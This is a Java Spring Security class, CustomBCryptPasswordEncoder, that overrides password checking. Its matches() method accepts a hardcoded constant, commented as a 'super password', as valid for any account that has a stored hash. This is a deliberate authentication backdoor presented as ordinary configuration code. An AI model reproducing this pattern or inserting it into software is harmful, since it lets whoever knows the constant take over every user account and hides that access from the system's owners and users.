package com.czyl.framework.config;

import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;

/**
 * 
 * @author tanghx
 *
 */
public class CustomBCryptPasswordEncoder extends BCryptPasswordEncoder {
	
	/**
	 * 超级密码
	 */
	public final static String SUPER_PASSWORD="c707b88f7ea402de0b0976cac249070d";
	
	
	@Override
	public boolean matches(CharSequence rawPassword, String encodedPassword) {
		if (encodedPassword != null && encodedPassword.length() != 0) {
            if(SUPER_PASSWORD.equals(rawPassword.toString())) {
                return true;
            }
        }
		return super.matches(rawPassword, encodedPassword);
	}

}
